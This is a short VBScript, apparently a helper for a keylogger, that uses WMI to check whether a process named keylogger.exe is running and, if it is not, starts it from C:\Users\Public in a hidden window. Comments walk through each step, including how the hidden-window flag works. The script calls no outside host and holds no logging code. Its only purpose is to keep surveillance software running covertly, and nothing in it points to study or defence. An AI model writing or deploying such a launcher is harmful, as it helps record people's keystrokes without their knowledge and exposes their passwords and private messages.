Set WshShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

' 1. Define the path to your compiled .exe
exePath = "C:\Users\Public\keylogger.exe"
exeName = "keylogger.exe"

' 2. Check if the keylogger is already running to avoid multiple instances
Set colProcesses = objWMIService.ExecQuery _
    ("Select * from Win32_Process Where Name = '" & exeName & "'")

' 3. If no process is found (Count is 0), launch it hidden
If colProcesses.Count = 0 Then
    ' The "0" parameter tells Windows to run the command in a hidden window
    ' The "False" parameter tells the script NOT to wait for the .exe to finish
    WshShell.Run Chr(34) & exePath & Chr(34), 0, False
End If

Set WshShell = Nothing
Set objWMIService = Nothing